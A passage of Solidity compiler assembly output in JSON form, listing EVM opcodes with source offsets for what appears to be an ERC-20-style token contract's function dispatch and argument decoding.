											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2"
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "DUP2"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "DUP2"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "DUP4"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "DUP3"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD"
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE"
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "AND"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ISZERO"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPI"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "EXP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "NOT"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "AND"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "RETURN"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "AND"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ADD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "MLOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ISZERO"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ISZERO"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP3"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "MSTORE"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "MLOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SUB"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ADD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "RETURN"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "MLOAD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP2"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP3"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "MSTORE"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "MLOAD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP2"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SUB"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "ADD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "RETURN"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMPDEST"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "AND"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "ADD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "AND"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "ADD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH [tag]",
											"value": "33"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMPDEST"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "PUSH [tag]",
											"value": "35"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMPDEST"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH [tag]",
											"value": "36"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "tag",
											"value": "36"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMPDEST"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "MLOAD"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP3"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "AND"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP3"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "MSTORE"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "MLOAD"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SUB"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "ADD"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "RETURN"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMPDEST"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "PUSH [tag]",
											"value": "39"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMPDEST"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "DUP1"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "41"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "AND"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH [tag]",
											"value": "42"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMPDEST"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "DUP1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "44"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "44"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "AND"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH [tag]",
											"value": "45"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMPDEST"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "DUP1"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "47"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "47"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "AND"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH [tag]",
											"value": "48"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMPDEST"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH [tag]",
											"value": "50"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "JUMPDEST"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "DUP1"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "56"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "56"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "DUP2"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "AND"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "SWAP1"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "ADD"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH [tag]",
											"value": "57"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMPDEST"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 16,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 17,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "59"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "59"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "AND"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "AND"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
